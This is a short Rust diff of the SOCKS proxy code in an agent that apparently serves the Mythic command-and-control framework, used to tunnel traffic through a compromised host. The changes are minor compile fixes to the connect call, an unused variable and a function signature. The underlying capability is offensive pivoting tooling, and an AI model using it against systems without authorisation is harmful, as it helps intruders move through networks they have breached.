@@ -236,7 +236,7 @@ async fn run_session(
     debug_to_mythic(&parent_task_id, "socks.connect.try", format!("target={}:{}", addr, port));
 
     // Connect to destination
-    let remote = match timeout(Duration::from_secs(15), TcpStream::connect((addr, port))).await {
+    let remote = match timeout(Duration::from_secs(15), TcpStream::connect((addr.as_str(), port))).await {
         Ok(Ok(s)) => s,
         Ok(Err(e)) => {
             let rep = if e.to_string().to_lowercase().contains("refused") { 0x05 }
@@ -299,7 +299,7 @@ async fn run_session(
     });
 
     // M2A: Mythic to Agent (recv from mythic -> write to remote)
-    let sid_dn = server_id.clone();
+    let _sid_dn = server_id.clone(); // Prefix with _ to suppress unused warning
     let parent_dn = parent_task_id.clone();
     let m2a = tokio::spawn(async move {
         let mut total: u64 = 0;
@@ -426,6 +426,7 @@ pub fn handle_socks(
 }
 
 pub fn setup_socks(
+    _tx: &std_mpsc::Sender<Value>,
     rx: std_mpsc::Receiver<Value>,
 ) -> Result<(), Box<dyn Error>> {
     handle_socks(rx)
